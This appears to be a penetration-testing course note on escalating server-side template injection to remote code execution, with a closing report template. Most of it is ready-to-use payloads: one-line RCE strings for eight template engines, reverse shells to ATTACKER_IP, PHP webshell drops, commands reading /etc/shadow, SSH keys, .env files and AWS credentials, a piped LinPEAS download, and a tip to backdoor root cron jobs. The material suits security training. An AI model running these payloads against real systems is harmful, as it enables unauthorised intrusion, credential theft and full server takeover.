---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.08 SSTI to RCE Escalation"
---

# 09.08 — SSTI to RCE Escalation

## Escalation Path Overview

```
SSTI DISCOVERY:
  {{7*7}} → 49 (confirmed)
         ↓
IDENTIFY ENGINE:
  {{7*'7'}} → 7777777 (Jinja2) / 49 (Twig)
         ↓
DATA LEAKAGE:
  Read config, env vars, secrets
         ↓
RCE:
  Read/write files, execute OS commands
         ↓
REVERSE SHELL:
  Full interactive access
         ↓
PRIVILEGE ESCALATION:
  Check sudo, SUID, cron, LinPEAS
         ↓
ROOT / FULL COMPROMISE
```

---

## Quick RCE by Engine

```
ENGINE      ONE-LINER RCE
------      -------------
Jinja2      {{cycler.__init__.__globals__.os.popen('id').read()}}
Twig        {{_self.env.registerUndefinedFilterCallback("exec")}}{{"id"|filter}}
FreeMarker  ${"freemarker.template.utility.Execute"?new()("id")}
ERB         <%= `id` %>
Velocity    #set($x = "")#set($rt = $x.class.forName('java.lang.Runtime'))...
Smarty      {if system('id')}{/if}
EJS         <%= require('child_process').execSync('id').toString() %>
Pug         - var x = require('child_process').execSync('id').toString()
            = x
```

---

## From RCE to Reverse Shell

### Jinja2

```python
{{cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").read()}}

# URL-ENCODED IN CURL:
curl -G "https://target.com/page" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\").read()}}"
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"|filter}}
```

### FreeMarker (Java)

```java
${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}
```

### ERB (Ruby)

```ruby
<%= fork { exec "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" } %>
```

---

## From RCE to Webshell

```bash
# WRITE PHP WEBSHELL:
# Jinja2:
{{cycler.__init__.__globals__.os.popen("echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php").read()}}

# FreeMarker:
${"freemarker.template.utility.Execute"?new()("bash -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4= | base64 -d > /var/www/html/shell.php'")}
# PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4= = base64 of <?php system($_GET["cmd"]); ?>

# ERB:
<%= system("echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php") %>

# THEN VERIFY WEBSHELL:
curl "https://target.com/shell.php?cmd=id"
```

---

## Reading Critical Files via SSTI

```python
# JINJA2 — READ FILE:
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('cat /var/www/html/.env').read()}}
{{cycler.__init__.__globals__.os.popen('cat /var/www/html/config.py').read()}}
{{cycler.__init__.__globals__.os.popen('env').read()}}

# JINJA2 — CONFIG OBJECT:
{{config}}
{{config.items()}}

# ERB — DIRECT FILE READ:
<%= File.read('/etc/passwd') %>
<%= File.read('/var/www/rails/config/database.yml') %>

# HIGH-VALUE FILES:
/etc/passwd
/etc/shadow                      ← if root: password hashes
/var/www/html/.env               ← DB credentials, API keys
/var/www/html/config.py          ← Flask config
/var/www/rails/config/database.yml  ← Rails DB config
/var/www/rails/config/secrets.yml   ← Rails secret_key_base
/root/.ssh/id_rsa                ← root SSH key (if root)
/home/ubuntu/.ssh/id_rsa         ← user SSH key
~/.aws/credentials               ← AWS keys!
/proc/self/environ               ← environment variables
/proc/1/cmdline                  ← process 1 cmdline
```

---

## Environment Variable Extraction

```python
# JINJA2:
{{cycler.__init__.__globals__.os.environ}}
{{cycler.__init__.__globals__.os.environ.get('SECRET_KEY')}}
{{cycler.__init__.__globals__.os.environ.get('DATABASE_URL')}}
{{cycler.__init__.__globals__.os.environ.get('AWS_ACCESS_KEY_ID')}}
{{cycler.__init__.__globals__.os.environ.get('REDIS_URL')}}

# USING REQUEST OBJECT (Flask):
{{request.environ}}
{{request.environ.get('SERVER_NAME')}}

# ERB:
<%= ENV.inspect %>
<%= ENV['DATABASE_URL'] %>
<%= ENV['SECRET_KEY_BASE'] %>

# FREEMARKER:
<#assign x = .data_model>
${x?keys?join(', ')}   ← list all template variables
```

---

## Privilege Escalation After Shell

```bash
# STANDARD LINUX PRIVESC CHECKS:
# 1. Check current user:
id && whoami && hostname && uname -a

# 2. Check sudo permissions:
sudo -l  → NOPASSWD entries = free root!

# 3. Check SUID binaries:
find / -perm -4000 -type f 2>/dev/null | head -20
# Look for: /usr/bin/python3, /usr/bin/perl, /usr/bin/vi → trivial privesc!

# 4. Check writable cron jobs:
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
# If you can write to any script run by root → add reverse shell to it!

# 5. Download LinPEAS:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# 6. Check Docker escape:
cat /proc/1/cgroup | grep docker  ← if running in container
# If in Docker: check for privileged container escape!
```

---

## Reporting SSTI

```
SEVERITY: CRITICAL (RCE = highest possible)

TEMPLATE REPORT:

TITLE: Server-Side Template Injection in [Field Name] Leading to RCE

DESCRIPTION:
  The [field] parameter is vulnerable to Server-Side Template Injection
  via [Engine] (Python/Jinja2, PHP/Twig, etc.). User-supplied input is
  interpolated directly into a template string and processed by the engine,
  allowing arbitrary code execution.

EVIDENCE:
  1. Confirm injection:
     GET /page?field={{7*7}} HTTP/1.1
     Response: 49 (7*7 evaluated server-side)

  2. Confirm RCE:
     GET /page?field={{cycler.__init__.__globals__.os.popen('id').read()}} HTTP/1.1
     Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

IMPACT:
  Remote code execution as www-data
  Access to server filesystem and environment variables
  Potential for full server compromise

CVSS: 10.0 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

---

## Related Notes
- [[04 - SSTI in Jinja2]] — Jinja2 exploitation
- [[05 - SSTI in Twig]] — Twig exploitation
- [[06 - SSTI in Freemarker]] — FreeMarker exploitation
- [[07 - SSTI in ERB]] — ERB exploitation
- [[11 - Reverse Shell Payloads]] — reverse shells
- [[Module 08 - Command Injection]] — similar impact
